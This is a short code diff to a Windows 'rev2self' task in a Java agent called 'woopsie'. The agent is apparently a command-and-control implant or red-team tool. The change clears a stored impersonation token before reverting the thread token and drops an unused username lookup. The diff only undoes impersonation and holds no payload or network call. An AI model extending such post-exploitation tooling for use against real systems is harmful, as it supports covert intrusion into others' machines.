@@ -19,13 +19,13 @@ public class Rev2SelfTask implements Task {
             throw new Exception("rev2self is only supported on Windows");
         }
         
+        // Clear the stored impersonation token
+        com.woopsie.Agent.clearImpersonationToken();
+        
         // Revert to original token
         String result = WindowsAPI.revertToSelf();
         
         Config.debugLog(config, "Reverted to original token");
-        
-        // Get current user context after reverting
-        String username = com.woopsie.utils.SystemInfo.getUsername();
         
         // Return JSON with callback field containing empty impersonation_context (matches oopsie format)
         return String.format(
